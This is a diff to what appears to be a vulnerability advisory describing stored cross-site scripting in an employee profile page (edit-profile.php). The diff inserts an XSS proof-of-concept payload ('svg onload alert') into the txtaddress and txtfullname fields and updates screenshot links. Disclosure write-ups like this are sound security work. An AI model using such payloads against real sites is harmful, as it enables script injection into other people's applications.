@@ -37,8 +37,8 @@ The parameter  `txtfullname` and `txtaddress` are being echoed directly into the
 
 ```php
 # Employee/edit-profile.php
-<input type="text" size="77" name="txtaddress" value="USA" class="form-control">
-<input type="text" size="77" name="txtfullname" value="hello" class="form-control" required="">
+<input type="text" size="77" name="txtaddress" value=""><svg/onload=alert(1)>" class="form-control">
+<input type="text" size="77" name="txtfullname" value=""><svg/onload=alert(1)>" class="form-control" required="">
 ```
 
 ### Proof of Concept:
@@ -51,9 +51,13 @@ Payload:
 
 
 ### Screenshot
+![1](https://github.com/user-attachments/assets/91a83b9f-452c-444d-98f9-9f242919d6c2)
 
-![image-20240506134915672](./screenshot/image-20240506134915672.png)
+![4](https://github.com/user-attachments/assets/d3d1bcb8-b20a-4b44-aed4-0be8299e30fb)
 
-![image-20240506134828534](./screenshot/image-20240506134828534.png)
+![3](https://github.com/user-attachments/assets/5087db72-8b45-44c6-ad3e-34157b78b11f)
 
-![image-20240506134853589](./screenshot/image-20240506134853589.png)
+![2](https://github.com/user-attachments/assets/8dff777a-2c8d-466b-a072-43523ae747d9)
+
+
+
